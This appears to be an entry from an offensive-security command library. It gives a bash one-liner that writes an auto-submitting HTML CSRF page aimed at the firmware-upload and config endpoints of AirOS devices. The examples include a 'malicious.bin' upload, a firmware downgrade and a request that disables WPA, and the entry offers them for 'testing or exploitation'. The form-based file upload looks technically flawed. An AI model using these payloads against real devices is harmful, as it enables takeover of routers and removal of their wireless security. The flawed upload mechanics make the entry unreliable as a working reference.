---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: generate-csrf-poc
type: command
executor: bash
data: >-
  echo '<!DOCTYPE html><html><body><form action="http://TARGET_IP/upload.cgi"
  method="POST" enctype="multipart/form-data"><input type="hidden"
  name="firmware" value="malicious.bin" /><input type="submit"
  id="submit"></form><script>document.getElementById("submit").click();</script></body></html>'
  > csrf_poc.html
output: null
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:27:50.371Z'
platforms:
  - Linux
  - macOS
tags:
  - csrf
  - poc
verified: false
validated: true
submitted: true
---

# generate-csrf-poc

## Command

```bash
echo '<!DOCTYPE html><html><body><form action="http://TARGET_IP/upload.cgi" method="POST" enctype="multipart/form-data"><input type="hidden" name="firmware" value="malicious.bin" /><input type="submit" id="submit"></form><script>document.getElementById("submit").click();</script></body></html>' > csrf_poc.html
```

## Description

This command generates a basic HTML proof-of-concept for CSRF attacks by creating an auto-submitting form targeting a vulnerable endpoint, such as firmware upload in AirOS. Use it to quickly prototype malicious pages for testing or exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `TARGET_IP` | IP address of the vulnerable AirOS device | Yes |
| `malicious.bin` | Path to the file for upload (hidden input) | Yes |

## Examples

### Basic Usage

```bash
echo '<!DOCTYPE html><html><body><form action="http://192.168.1.1/upload.cgi" method="POST"><input type="hidden" name="firmware" value="downgrade.bin" /><input type="submit" id="submit"></form><script>document.getElementById("submit").click();</script></body></html>' > csrf_poc.html
```

### Advanced Usage

```bash
echo '<!DOCTYPE html><html><body><form action="http://TARGET_IP/config.cgi" method="POST"><input type="hidden" name="cfg_change" value="disable_wpa" /><input type="submit"></form><script>document.forms[0].submit();</script></body></html>' > config_csrf.html
```

## Expected Output

Creates a file `csrf_poc.html` containing the HTML code. No console output; verify by opening the file in a text editor. When hosted and visited, it triggers the form submission.

## Related

- [[Related Procedure: Exploit-CSFR-in-AirOS-Firmware]]
